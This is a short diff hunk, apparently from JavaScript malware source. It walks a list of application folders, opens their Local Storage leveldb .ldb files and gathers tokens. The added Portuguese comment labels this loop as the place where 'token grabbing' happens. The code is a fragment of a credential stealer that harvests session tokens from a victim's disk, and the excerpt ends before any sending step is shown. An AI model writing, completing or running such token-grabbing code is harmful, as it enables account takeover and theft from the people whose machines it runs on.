@@ -27,7 +27,7 @@ for(const a in loc){
 
 var tokens = []
 
-for(let b of devdd){
+for(let b of devdd){ //aqui é onde o treco de pegar token acontece
     b += `\\Local Storage\\leveldb`
     const files = fs.readdirSync(b).filter(file => file.endsWith(`.ldb`))
     for(const c in files){
